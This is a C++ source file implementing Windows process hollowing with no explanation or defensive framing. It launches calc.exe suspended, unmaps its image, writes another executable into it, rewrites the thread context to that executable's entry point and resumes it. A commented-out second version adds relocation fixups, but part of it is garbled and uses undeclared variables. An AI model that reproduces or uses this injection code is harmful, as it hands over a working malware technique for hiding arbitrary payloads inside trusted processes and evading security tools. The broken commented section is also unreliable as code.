#include <Windows.h>
#include <winternl.h>
#include <iostream>
//#include "winternl.h""

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

// resolve NtQueryInformationProcess()
HANDLE hNtdll = GetModuleHandle((LPCWSTR)L"ntdll");
FARPROC fpNtQueryInformationProcess = GetProcAddress((HMODULE)hNtdll, (LPCSTR)"NtQueryInformationProcess");
_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;

// resolve native function NtUnmapViewOfSection()
FARPROC fpNtUnmapViewOfSection = GetProcAddress((HMODULE)hNtdll, (LPCSTR)"NtUnmapViewOfSection");
_NtUnmapViewOfSection pNtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;






int RunPortableExecutable(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;

	DWORD* ImageBase; //Base address of the image
	void* pImageBase; // Pointer to the image base

	int count;
	char CurrentFilePath[1024] = "C:\\Windows\\SysWOW64\\calc.exe";

	DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Initialize
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		ZeroMemory(&PI, sizeof(PI)); // Null the memory
		ZeroMemory(&SI, sizeof(SI)); // Null the memory

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current
			//process in suspended state, for the new image.
		{
			// Allocate memory for the context.
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
			{
				// Read instructions
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
				//HMODULE dll = LoadLibraryA("ntdll.dll");
				((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(LoadLibraryA("ntdll.dll"), "NtUnmapViewOfSection"))(PI.hProcess, (LPVOID)NtHeader->OptionalHeader.ImageBase);
				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				if (pImageBase == 0) {
					TerminateProcess(PI.hProcess, 0);
					return 0;
				}

				// Write the image to the process
				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), PVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

				// Move address of entry point to the eax register
				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
				ResumeThread(PI.hThread); //´Start the process/call main()

				return 0; // Operation was successful.
			}
		}
	}
}
#pragma warning(disable:4996)
BYTE* MapFileToMemory(const char filename[])
{
	FILE* fileptr;
	BYTE* buffer;

	fileptr = fopen(filename, "rb");  // Open the file in binary mode
	fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
	long filelen = ftell(fileptr);             // Get the current byte offset in the file
	rewind(fileptr);                      // Jump back to the beginning of the file

	buffer = (BYTE*)malloc((filelen + 1) * sizeof(char)); // Enough memory for file + \0
	fread(buffer, filelen, 1, fileptr); // Read in the entire file
	fclose(fileptr); // Close the file

	return buffer;
}

int main()
{
	RunPortableExecutable(MapFileToMemory("powershell.exe"));
	return 0;
}
/*
int AAA()
{
	LPCTSTR sTargetProcessPath = L"C:\\windows\\system32\\calc.exe";
	LPCTSTR sInjectedFilePath = L"C:\\windows\\system32\\notepad.exe";

	// start target process in suspended state
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&processInfo, sizeof(processInfo));
	CreateProcess(sTargetProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo);

	// open injector
	HANDLE hInjectorFile = CreateFile(sInjectedFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	// copy injector image into memory
	DWORD injectorFileSize = GetFileSize(hInjectorFile, NULL);
	LPBYTE pLocalCopy = (LPBYTE)malloc(injectorFileSize);
	ReadFile(hInjectorFile, pLocalCopy, injectorFileSize, NULL, NULL);        
	IMAGE_DOS_HEADER)pLocalCopy)->e_lfanew);
	PIMAGE_SECTION_HEADER injectorSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)injectorPEHeaders + sizeof(IMAGE_NT_HEADERS));
	DWORD injectorModuleSize = injectorPEHeaders->OptionalHeader.SizeOfImage;

	// allocate space in target process
	LPVOID lpRemoteAllocation = VirtualAllocEx(processInfo.hProcess, targetPEB.Reserved3[1], injectorModuleSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// calculate fixup delta
	DWORD_PTR delta = (DWORD_PTR)((LPBYTE)lpRemoteAllocation - (LPBYTE)injectorPEHeaders->OptionalHeader.ImageBase);

	// fixup ImageBase in injector copy
	injectorPEHeaders->OptionalHeader.ImageBase = (ULONGLONG)lpRemoteAllocation;

	// write injector headers to target process
	WriteProcessMemory(processInfo.hProcess, lpRemoteAllocation, pLocalCopy, injectorPEHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// recursively write injector sections to target process
	for (size_t i = 0; i < injectorPEHeaders->FileHeader.NumberOfSections; i++) {
		// skip empty sections
		if (!injectorSectionHeader[i].PointerToRawData)
			continue;

		// calculate section location in target process
		LPVOID psectionDestination = (LPVOID)((LPBYTE)lpRemoteAllocation + injectorSectionHeader[i].VirtualAddress);

		// write this section into memory
		WriteProcessMemory(processInfo.hProcess, psectionDestination, &pLocalCopy[injectorSectionHeader[i].PointerToRawData], injectorSectionHeader[i].SizeOfRawData, NULL);
	}

	// fixup remote image
	if (delta) {
		// find .reloc section
		size_t relocIndex;
		for (relocIndex = 0; relocIndex < injectorPEHeaders->FileHeader.NumberOfSections; relocIndex++)
			if (0 == strcmp((const char*)injectorSectionHeader[relocIndex].Name, (const char*)".reloc"))
				break;

		PIMAGE_BASE_RELOCATION relocs = (PIMAGE_BASE_RELOCATION)(pLocalCopy + injectorSectionHeader[relocIndex].PointerToRawData);

		// walk reloc blocks
		while (relocs->VirtualAddress != 0) {
			// only process if block contains relocation descriptors
			if (relocs->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
				// count relocation descriptors
				DWORD numDescriptors = (relocs->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				LPWORD descriptorList = (LPWORD)((LPBYTE)relocs + sizeof(IMAGE_BASE_RELOCATION));

				// for each descriptor
				for (DWORD i = 0; i < numDescriptors; i++) {
					if (descriptorList[i] > 0) {
						// p points to fixup location (for injector image desired load address)
						DWORD_PTR* fix = (DWORD_PTR*)((LPBYTE)lpRemoteAllocation + (relocs->VirtualAddress + (0x0FFF & (descriptorList[i]))));
						// add delta to fix address in remote process
						DWORD_PTR temp;
						ReadProcessMemory(processInfo.hProcess, fix, &temp, sizeof(DWORD_PTR), NULL);
						temp += delta;
						WriteProcessMemory(processInfo.hProcess, fix, &temp, sizeof(DWORD_PTR), NULL);
					}
				}
			}
			// set reloc pointer to next reloc block
			relocs = (PIMAGE_BASE_RELOCATION)((LPBYTE)relocs + relocs->SizeOfBlock);
		}
	}
	free(pLocalCopy);

	// get primary thread context of target process
	CONTEXT cTargetThreadContext;
	cTargetThreadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(processInfo.hThread, &cTargetThreadContext);

	// set new context of target process
	DWORD_PTR entrypoint = (DWORD_PTR)((LPBYTE)lpRemoteAllocation + injectorPEHeaders->OptionalHeader.AddressOfEntryPoint);
	cTargetThreadContext.Rcx = entrypoint;
	SetThreadContext(processInfo.hThread, &cTargetThreadContext);

	// resume thread
	ResumeThread(processInfo.hThread);

	return 0;
}
*/

